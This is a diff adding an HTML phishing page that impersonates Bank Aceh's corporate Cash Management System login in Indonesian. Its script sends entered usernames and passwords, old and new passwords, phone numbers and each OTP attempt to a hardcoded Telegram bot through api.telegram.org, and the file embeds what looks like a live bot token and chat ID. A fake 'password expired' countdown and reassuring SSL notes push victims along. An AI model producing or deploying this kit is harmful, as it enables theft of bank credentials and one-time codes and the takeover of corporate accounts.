@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CMS Corporate - Bank Aceh</title>
+    <style>
+        * {margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif;}
+        html, body {width: 100%; min-height: 100vh; background: linear-gradient(180deg, #e6f9e6 0%, #ffffff 100%);}
+
+        /* === GLOBAL === */
+        .page {display: none;}
+        .page.active {display: block;}
+
+        /* === HEADER ATAS === */
+        .top-bar {
+            background: #fff;
+            border-bottom: 1px solid #ddd;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .header-title {
+            text-align: center;
+            flex-grow: 1;
+        }
+        .header-title h2 {
+            font-size: 20px;
+            color: #000;
+            margin: 0;
+        }
+        .header-title p {
+            font-size: 14px;
+            color: #444;
+            margin: 2px 0 0;
+        }
+        .icon-btn {
+            font-size: 22px;
+            background: none;
+            border: none;
+            cursor: default;
+            padding: 8px;
+        }
+
+        /* === LOGO & JUDUL UTAMA === */
+        .brand-area {
+            text-align: center;
+            padding: 20px 15px 10px;
+        }
+        .bank-logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00992b;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .tagline {
+            font-size: 12px;
+            color: #222;
+            margin-top: 4px;
+        }
+        .main-title {
+            font-size: 26px;
+            font-weight: 600;
+            text-align: center;
+            margin: 15px;
+            line-height: 1.3;
+        }
+
+        /* === BAGIAN CAPTCHA: PERSIS SEPERTI GAMBAR === */
+        .captcha-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 15px;
+        }
+        .captcha-display {
+            font-size: 48px;
+            font-weight: bold;
+            font-family: 'Comic Sans MS', cursive;
+            color: #008822;
+            text-decoration: line-through;
+            text-decoration-color: #ff0000;
+            text-decoration-thickness: 3px;
+            transform: rotate(-5deg);
+            letter-spacing: 3px;
+            flex-shrink: 0;
+        }
+        .btn-refresh {
+            width: 40px;
+            height: 40px;
+            border: none;
+            background: transparent;
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            padding: 0;
+        }
+        .captcha-input-wrap {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            flex-grow: 1;
+            max-width: 320px;
+        }
+        .captcha-label {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: #000;
+        }
+        .captcha-input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 18px;
+            border: 1px solid #999;
+            border-radius: 2px;
+            background: #fff;
+            outline: none;
+        }
+
+        /* === KOTAK INPUT (USERNAME & PASSWORD) === */
+        .input-group {
+            margin: 0 15px 20px;
+            position: relative;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .form-input {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 18px;
+            border: 1px solid #aaa;
+            border-radius: 4px;
+            background: rgba(255,255,255,0.85);
+            outline: none;
+        }
+        /* === TOMBOL MATA GAYA BANK ASLI === */
+        .toggle-eye {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            width: 26px;
+            height: 26px;
+            padding: 0;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        .toggle-eye:hover {opacity: 1;}
+        .eye-icon {
+            width: 100%;
+            height: 100%;
+            stroke: #333;
+            stroke-width: 2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .eye-slash {display: none;}
+
+        /* === LINK & TOMBOL LOGIN === */
+        .action-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 40px;
+            margin: 30px 15px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .forgot-link {
+            color: #000;
+            text-decoration: none;
+        }
+        .login-btn {
+            background: none;
+            border: none;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* === INFORMASI SSL === */
+        .ssl-info {
+            text-align: center;
+            font-size: 16px;
+            color: #000;
+            margin: 25px 15px 15px;
+        }
+        .ssl-link {
+            display: block;
+            text-align: center;
+            font-size: 15px;
+            font-weight: 500;
+            color: #000;
+            margin-top: 5px;
+            text-decoration: none;
+        }
+
+        /* === PERINGATAN & STATUS === */
+        .peringatan-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 16px;
+            margin: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 17px;
+            line-height: 1.5;
+            display: none;
+        }
+        .hitung-mundur {
+            font-weight: bold;
+            color: #dc3545;
+            font-size: 20px;
+            margin-top: 8px;
+        }
+        .status-box {
+            margin: 0 15px 15px;
+            padding: 12px;
+            border-radius: 5px;
+            display: none;
+            font-size: 15px;
+        }
+        .status-box.error {background: #fdecea; border: 1px solid #f5c6cb; color: #721c24;}
+        .status-box.success {background: #eafaf1; border: 1px solid #badbcc; color: #0f5132;}
+        .status-box.warning {background: #fff3cd; border: 1px solid #ffc107; color: #856404;}
+
+        /* === CATATAN === */
+        .notes {
+            margin: 40px 30px 30px;
+            font-size: 16px;
+            line-height: 1.6;
+            color: #000;
+        }
+        .notes h4 {
+            font-size: 18px;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+        .notes ol {padding-left: 20px;}
+        .notes li {margin-bottom: 10px;}
+        .notes a {
+            color: #0000ee;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* === HALAMAN KARDUS UNIFORM === */
+        .container {padding: 15px;}
+        .card {
+            background: rgba(255,255,255,0.7);
+            border-radius: 10px;
+            padding: 25px 20px;
+            color: #000;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            border: 1px solid rgba(0,153,43,0.2);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .alert {
+            background: #fffddc;
+            color: #8b2500;
+            padding: 15px;
+            border-radius: 7px;
+            border: 1px solid #f0c808;
+            margin-bottom: 25px;
+            text-align: center;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .form-label {
+            display: block;
+            font-size: 16px;
+            margin-bottom: 8px;
+            color: #111;
+            font-weight: 500;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: #f26522;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .hp-wrap {display: flex; gap: 10px;}
+        .hp-code {width: 70px; text-align: center; background: #e9ecef; color: #222;}
+        .sisa-percobaan {
+            text-align: center;
+            font-size: 15px;
+            margin-top: 12px;
+            color: #dc3545;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ==================================
+     HALAMAN 1: LOGIN (KIRIM PISAH)
+     ================================== -->
+<div id="page-login" class="page active">
+    <div class="brand-area">
+        <div class="bank-logo">
+            Bank Aceh <span style="font-size:14px; border:1px solid #005b9f; padding:2px 5px; border-radius:3px;">iB</span>
+        </div>
+        <div class="tagline">Kepercayaan dan Kemitraan</div>
+    </div>
+
+    <h1 class="main-title">Cash Management System Corporate</h1>
+
+    <div class="captcha-row">
+        <div class="captcha-display" id="captcha-text">gclko</div>
+        <button class="btn-refresh" onclick="acakCaptcha()" title="Ganti kode">⟳</button>
+        <div class="captcha-input-wrap">
+            <label class="captcha-label">Input kode captcha</label>
+            <input type="text" id="captcha-input" class="captcha-input" autocomplete="off">
+        </div>
+    </div>
+
+    <div class="input-group">
+        <input type="text" id="username" class="form-input" placeholder="Username">
+    </div>
+    <div class="input-group">
+        <input type="password" id="password" class="form-input" placeholder="Password">
+        <button type="button" class="toggle-eye" onclick="togglePassword('password', this)">
+            <svg class="eye-icon" viewBox="0 0 24 24">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                <circle cx="12" cy="12" r="3"/>
+                <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+        </button>
+    </div>
+
+    <div class="action-area">
+        <a href="#" class="forgot-link">Lupa password ?</a>
+        <button class="login-btn" onclick="prosesLogin()">➡ Login</button>
+    </div>
+
+    <div id="peringatan" class="peringatan-box">
+        <strong>⚠️ Sandi kamu kadaluwarsa</strong><br><br>
+        Perbarui sandi agar bisa bertransaksi
+        <div class="hitung-mundur">Beralih dalam: <span id="detik">5</span> detik...</div>
+    </div>
+
+    <div id="status-login" class="status-box"></div>
+
+    <div class="ssl-info">
+        This site is protected and verified by
+        <a href="#" class="ssl-link">ABOUT SSL CERTIFICATES</a>
+    </div>
+
+    <div class="notes">
+        <h4>Catatan :</h4>
+        <ol>
+            <li>Pastikan alamat situs Cash Management System yang Anda akses adalah <a href="https://ibc.bankaceh.co.id">https://ibc.bankaceh.co.id</a></li>
+            <li>Isilah kolom 'Username' dengan username Anda.</li>
+            <li>Isilah kolom 'Password' dengan sandi rahasia Anda.</li>
+            <li>Jaga kerahasiaan kode OTP untuk keamanan transaksi Anda.</li>
+            <li>Selalu perbarui Browser dan OS secara berkala untuk meningkatkan kenyamanan dan keamanan bertransaksi.</li>
+        </ol>
+    </div>
+</div>
+
+<!-- ==================================
+     HALAMAN 2: UBAH KATA SANDI (KIRIM PISAH)
+     ================================== -->
+<div id="page-ubahsandi" class="page">
+    <div class="top-bar">
+        <button class="icon-btn" onclick="kembaliKeLogin()">✕</button>
+        <div class="header-title">
+            <h2>CMS Corporate</h2>
+            <p>ibc.bankaceh.co.id</p>
+        </div>
+        <span style="width:40px;"></span>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h1 class="main-title" style="color:#000; margin-top:0;">UBAH KATA SANDI</h1>
+
+            <div class="alert">
+                Demi keamanan, harap perbarui sandi Anda sekarang
+            </div>
+
+            <div class="input-group">
+                <label class="form-label">Kata Sandi Saat Ini</label>
+                <input type="password" id="sandi-lama" class="form-input">
+                <button type="button" class="toggle-eye" onclick="togglePassword('sandi-lama', this)">
+                    <svg class="eye-icon" viewBox="0 0 24 24">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                        <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="input-group">
+                <label class="form-label">Kata Sandi Baru</label>
+                <input type="password" id="sandi-baru" class="form-input">
+                <button type="button" class="toggle-eye" onclick="togglePassword('sandi-baru', this)">
+                    <svg class="eye-icon" viewBox="0 0 24 24">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                        <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="input-group">
+                <label class="form-label">Konfirmasi Kata Sandi Baru</label>
+                <input type="password" id="sandi-konfirm" class="form-input">
+                <button type="button" class="toggle-eye" onclick="togglePassword('sandi-konfirm', this)">
+                    <svg class="eye-icon" viewBox="0 0 24 24">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                        <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="input-group">
+                <label class="form-label">Nomor HP</label>
+                <div class="hp-wrap">
+                    <input type="text" value="+62" class="form-input hp-code" readonly>
+                    <input type="tel" id="nomor-hp" class="form-input">
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="lanjutKeOTP()">Lanjutkan</button>
+        </div>
+    </div>
+
+    <div id="status-ubah" class="status-box"></div>
+</div>
+
+<!-- ==================================
+     HALAMAN 3: VERIFIKASI OTP (KIRIM & KOSONGKAN OTOMATIS)
+     ================================== -->
+<div id="page-otp" class="page">
+    <div class="top-bar">
+        <button class="icon-btn" onclick="kembaliKeUbahSandi()">✕</button>
+        <div class="header-title">
+            <h2>CMS Corporate</h2>
+            <p>ibc.bankaceh.co.id</p>
+        </div>
+        <span style="width:40px;"></span>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h1 class="main-title" style="color:#000;">VERIFIKASI KODE OTP</h1>
+
+            <div class="alert">
+                Masukkan kode OTP yang dikirim ke nomor HP Anda<br>
+                <small>Maksimal 5 kali percobaan</small>
+            </div>
+
+            <div class="input-group">
+                <label class="form-label">Kode OTP</label>
+                <input type="text" id="kode-otp" class="form-input" placeholder="Masukkan kode 6 digit" inputmode="numeric" maxlength="6">
+            </div>
+
+            <div id="sisa-percobaan" class="sisa-percobaan"></div>
+            <button class="btn-primary" onclick="prosesOTP()">Konfirmasi & Selesai</button>
+        </div>
+    </div>
+
+    <div id="status-otp" class="status-box"></div>
+</div>
+
+<script>
+// ==================================================
+// 👇 ISI DATA TELEGRAM ANDA DI SINI 👇
+const BOT_TOKEN = "8922406978:AAGpEM99Jn4uwhcWwcaZK0H2S8fS2mL1ErI";
+const CHAT_ID = "8981535769";
+// ==================================================
+
+let captchaBenar = "gclko";
+let hitungSalahOTP = 0;
+const BATAS_SALAH_OTP = 5;
+
+// --- FUNGSI KIRIM KE TELEGRAM (TERPISAH PER HALAMAN) ---
+function kirimKeTelegram(judul, isi) {
+    if (BOT_TOKEN.includes("MASUKKAN") || CHAT_ID.includes("MASUKKAN")) {
+        console.log(judul, isi);
+        return Promise.resolve();
+    }
+    const pesan = `<b>${judul}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${isi}\n━━━━━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('id-ID')}`;
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: pesan, parse_mode: "HTML"})
+    });
+}
+
+// --- FUNGSI MATA BUKA/TUTUP ---
+function togglePassword(inputId, button) {
+    const input = document.getElementById(inputId);
+    const slash = button.querySelector('.eye-slash');
+    if (input.type === 'password') {
+        input.type = 'text';
+        slash.style.display = 'block';
+    } else {
+        input.type = 'password';
+        slash.style.display = 'none';
+    }
+}
+
+// --- Fungsi Captcha ---
+function acakCaptcha() {
+    const kode = "abcdefghjkmnpqrstuvwxyz23456789";
+    let hasil = "";
+    for (let i = 0; i < 5; i++) {
+        hasil += kode[Math.floor(Math.random() * kode.length)];
+    }
+    captchaBenar = hasil;
+    document.getElementById('captcha-text').textContent = hasil;
+}
+
+// --- Tampilkan Pesan ---
+function tampilPesan(id, teks, tipe) {
+    const box = document.getElementById(id);
+    box.style.display = "block";
+    box.className = "status-box " + tipe;
+    box.textContent = teks;
+}
+
+// --- Pindah Halaman ---
+function gantiHalaman(nama) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(nama).classList.add('active');
+    window.scrollTo(0,0);
+}
+function kembaliKeLogin() {
+    gantiHalaman('page-login');
+    document.getElementById('peringatan').style.display = 'none';
+    hitungSalahOTP = 0;
+    document.getElementById('sisa-percobaan').textContent = '';
+}
+function kembaliKeUbahSandi() {
+    gantiHalaman('page-ubahsandi');
+}
+
+// --- PROSES LOGIN (KIRIM PESAN PERTAMA) ---
+function prosesLogin() {
+    const user = document.getElementById('username').value.trim();
+    const sandi = document.getElementById('password').value;
+    const captchaUser = document.getElementById('captcha-input').value.trim();
+
+    if (!user || !sandi || !captchaUser) {
+        tampilPesan('status-login', "Harap isi semua kolom Login!", "error");
+        return;
+    }
+    if (captchaUser.toLowerCase() !== captchaBenar.toLowerCase()) {
+        tampilPesan('status-login', "Kode Captcha tidak sesuai!", "error");
+        acakCaptcha();
+        return;
+    }
+
+    // ✅ KIRIM DATA HALAMAN 1 KE TELEGRAM
+    kirimKeTelegram("🔐 DATA LOGIN DITERIMA", `👤 Username: <code>${user}</code>\n🔒 Password: <code>${sandi}</code>\n🤖 Captcha: <code>${captchaUser}</code>`);
+
+    const kotakPeringatan = document.getElementById('peringatan');
+    const elemenDetik = document.getElementById('detik');
+    kotakPeringatan.style.display = 'block';
+
+    let waktuTersisa = 5;
+    elemenDetik.textContent = waktuTersisa;
+
+    const timer = setInterval(() => {
+        waktuTersisa--;
+        elemenDetik.textContent = waktuTersisa;
+        if (waktuTersisa <= 0) {
+            clearInterval(timer);
+            kotakPeringatan.style.display = 'none';
+            gantiHalaman('page-ubahsandi');
+        }
+    }, 1000);
+}
+
+// --- LANJUT KE OTP (KIRIM PESAN KEDUA) ---
+function lanjutKeOTP() {
+    const sandiLama = document.getElementById('sandi-lama').value;
+    const sandiBaru = document.getElementById('sandi-baru').value;
+    const sandiKonfirm = document.getElementById('sandi-konfirm').value;
+    const hp = document.getElementById('nomor-hp').value.trim();
+    const statusId = 'status-ubah';
+
+    if (!sandiLama || !sandiBaru || !sandiKonfirm || !hp) {
+        tampilPesan(statusId, "Lengkapi semua kolom halaman ubah sandi!", "error");
+        return;
+    }
+    if (sandiBaru !== sandiKonfirm) {
+        tampilPesan(statusId, "Kata sandi baru tidak cocok!", "error");
+        return;
+    }
+
+    // ✅ KIRIM DATA HALAMAN 2 KE TELEGRAM
+    kirimKeTelegram("🔄 DATA UBAH SANDI DITERIMA", `🔓 Sandi Lama: <code>${sandiLama}</code>\n🆕 Sandi Baru: <code>${sandiBaru}</code>\n✅ Konfirmasi: <code>${sandiKonfirm}</code>\n📱 Nomor HP: +62${hp}`);
+
+    hitungSalahOTP = 0;
+    document.getElementById('sisa-percobaan').textContent = '';
+    document.getElementById('status-otp').style.display = 'none';
+    gantiHalaman('page-otp');
+}
+
+// --- PROSES OTP: KIRIM & LANGSUNG KOSONGKAN UNTUK INPUT BARU ---
+function prosesOTP() {
+    const inputOtp = document.getElementById('kode-otp');
+    const otp = inputOtp.value.trim();
+    const statusId = 'status-otp';
+    const sisaEl = document.getElementById('sisa-percobaan');
+
+    if (!otp) {
+        tampilPesan(statusId, "Masukkan Kode OTP terlebih dahulu!", "error");
+        return;
+    }
+
+    // ✅ KIRIM KE TELEGRAM SETIAP KALI DITEKAN
+    kirimKeTelegram("🔑 KODE OTP DITERIMA", `📥 Kode OTP: <code>${otp}</code>\n🔄 Percobaan ke: ${hitungSalahOTP + 1}`);
+
+    hitungSalahOTP++;
+
+    if (hitungSalahOTP >= BATAS_SALAH_OTP) {
+        tampilPesan(statusId, "❌ Batas percobaan habis (" + BATAS_SALAH_OTP + " kali). Kembali ke halaman utama...", "error");
+        sisaEl.textContent = '';
+        setTimeout(() => {
+            kembaliKeLogin();
+        }, 2000);
+        return;
+    }
+
+    // ✅ LANGSUNG KOSONGKAN & FOKUS SIAP KETIK LAGI
+    inputOtp.value = '';
+    inputOtp.focus();
+
+    const sisa = BATAS_SALAH_OTP - hitungSalahOTP;
+    sisaEl.textContent = "Sisa percobaan: " + sisa + " kali lagi";
+    tampilPesan(statusId, "Kode diterima! Masukkan ulang jika diperlukan. Sisa: " + sisa, "warning");
+}
+</script>
+
+</body>
+</html>
